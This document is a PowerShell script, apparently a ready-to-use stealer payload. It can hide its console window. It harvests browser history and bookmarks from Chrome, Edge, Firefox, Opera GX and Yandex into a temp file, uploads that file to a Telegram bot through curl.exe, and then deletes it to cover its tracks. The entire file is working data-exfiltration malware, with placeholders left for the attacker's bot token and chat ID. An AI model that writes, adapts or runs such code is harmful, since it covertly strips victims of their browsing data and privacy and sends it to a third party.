# Uncomment $hide='y' below to hide the console
# $hide='y'
if ($hide -eq 'y') {
    $w = (Get-Process -PID $pid).MainWindowHandle
    $a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $t = Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if ($w -ne [System.IntPtr]::Zero) {
        $t::ShowWindowAsync($w, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xx' })
        $w = $p.MainWindowHandle
        $t::ShowWindowAsync($w, 0)
    }
}

$Token = "$tg" # Replace with your Telegram bot token
$ChatID = "$ChatID" # Replace with your Telegram chat ID
$URL = 'https://api.telegram.org/bot{0}' -f $Token

# Sanitize username to avoid invalid characters in file name
$SanitizedUsername = $env:USERNAME -replace '[<>:"/\\|?*]', '_'
$outPath = "$env:temp\${SanitizedUsername}_browser_history.txt"
"Browser History `n -----------------------------------------------------------------------" | Out-File -FilePath $outPath -Encoding UTF8

# Define the Regular expression for extracting URLs
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Define paths for data storage
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'firefox_bookmarks' = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    'yandex_history'    = "$Env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\History"
    'yandex_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Bookmarks"
}

# Define browsers and data
$Browsers = @('chrome', 'edge', 'firefox', 'opera', 'yandex')
$DataValues = @('history', 'bookmarks')

foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]
        
        try {
            if ($Browser -eq 'firefox' -and $DataValue -eq 'bookmarks') {
                # Handle Firefox bookmarks (stored in places.sqlite)
                $ProfilePath = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Filter "*.default-release" -Directory | Select-Object -First 1 -ExpandProperty FullName
                if ($ProfilePath) {
                    $Path = Join-Path -Path $ProfilePath -ChildPath 'places.sqlite'
                    if (Test-Path $Path) {
                        # Note: places.sqlite requires SQL queries to extract bookmarks
                        # For simplicity, we'll skip direct SQL access here and note it
                        "Firefox bookmarks are stored in places.sqlite (requires SQLite query)" | Out-File -FilePath $outPath -Append -Encoding UTF8
                    } else {
                        "Firefox profile not found at $Path" | Out-File -FilePath $outPath -Append -Encoding UTF8
                    }
                } else {
                    "No Firefox default-release profile found" | Out-File -FilePath $outPath -Append -Encoding UTF8
                }
            } elseif (Test-Path $Path) {
                $Value = Get-Content -Path $Path -ErrorAction Stop | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort-Object -Unique
                $Value | ForEach-Object {
                    [PSCustomObject]@{
                        Browser  = $Browser
                        DataType = $DataValue
                        Content  = $_
                    }
                } | Out-File -FilePath $outPath -Append -Encoding UTF8
            } else {
                "Path not found: $PathKey for $Browser ($DataValue)" | Out-File -FilePath $outPath -Append -Encoding UTF8
            }
        } catch {
            "Error accessing $PathKey for $Browser ($DataValue): $_" | Out-File -FilePath $outPath -Append -Encoding UTF8
        }
    }
}

try {
    curl.exe -F chat_id="$ChatID" -F document=@"$outPath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
    Start-Sleep -Seconds 2
    Remove-Item -Path $outPath -Force
} catch {
    Write-Error "Failed to send file to Telegram: $_"
}